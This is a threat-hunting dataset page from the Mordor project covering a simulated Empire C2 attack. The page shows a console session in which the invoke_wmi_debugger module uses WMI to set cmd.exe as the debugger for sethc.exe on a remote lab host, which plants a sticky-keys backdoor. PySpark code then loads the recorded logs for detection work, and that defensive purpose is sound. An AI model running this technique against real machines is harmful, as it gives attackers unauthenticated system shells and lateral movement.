# Empire Invoke WMI Debugger

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518215622 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 19/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz |

## Dataset Description
This dataset represents adversaries using WMI to set the debugger for a target binary on a remote machine. Setting sethc.exe to be C:\Windows\System32\cmd.exe

## Adversary View
```
(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_wmi_debugger
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > info

              Name: Invoke-WMIDebugger
            Module: powershell/lateral_movement/invoke_wmi_debugger
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Uses WMI to set the debugger for a target binary on a remote
  machine to be cmd.exe or a stager.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True                                  Host[s] to execute the stager on, comma 
                                                    separated.                              
  Cleanup      False                                 Switch. Disable the debugger for the    
                                                    specified TargetBinary.                 
  TargetBinary True        sethc.exe                 Target binary to set the debugger for   
                                                    (sethc.exe, Utilman.exe, osk.exe,       
                                                    Narrator.exe, or Magnify.exe)           
  UserName     False                                 [domain\]username to use to execute     
                                                    command.                                
  Binary       False       C:\Windows\System32\cmd.  Binary to set for the debugger.         
                          exe                     
  RegPath      False       HKLM:Software\Microsoft\  Registry location to store the script   
                          Network\debug             code. Last element is the key name.     
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set Listener https
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set ComputerName IT001.shire.com
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set Listener ''
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > info

              Name: Invoke-WMIDebugger
            Module: powershell/lateral_movement/invoke_wmi_debugger
        NeedsAdmin: False
        OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
  OutputExtension: None

Authors:
  @harmj0y

Description:
  Uses WMI to set the debugger for a target binary on a remote
  machine to be cmd.exe or a stager.

Options:

  Name         Required    Value                     Description
  ----         --------    -------                   -----------
  Listener     False                                 Listener to use.                        
  CredID       False                                 CredID from the store to use.           
  ComputerName True        IT001.shire.com           Host[s] to execute the stager on, comma 
                                                    separated.                              
  Cleanup      False                                 Switch. Disable the debugger for the    
                                                    specified TargetBinary.                 
  TargetBinary True        sethc.exe                 Target binary to set the debugger for   
                                                    (sethc.exe, Utilman.exe, osk.exe,       
                                                    Narrator.exe, or Magnify.exe)           
  UserName     False                                 [domain\]username to use to execute     
                                                    command.                                
  Binary       False       C:\Windows\System32\cmd.  Binary to set for the debugger.         
                          exe                     
  RegPath      False       HKLM:Software\Microsoft\  Registry location to store the script   
                          Network\debug             code. Last element is the key name.     
  Password     False                                 Password to use to execute command.     
  Agent        True        V6W3TH8Y                  Agent to run module on.                 

(Empire: powershell/lateral_movement/invoke_wmi_debugger) > execute                                          
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
[*] Agent V6W3TH8Y tasked with task ID 7
[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi_debugger
(Empire: powershell/lateral_movement/invoke_wmi_debugger) > Invoke-Wmi executed on "IT001.shire.com" to set the debugger for sethc.exe to be C:\Windows\System32\cmd.exe.

(Empire: powershell/lateral_movement/invoke_wmi_debugger) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT channel, COUNT(1)
FROM mordorTable
GROUP BY channel
    '''
)
df.show(10,False)
        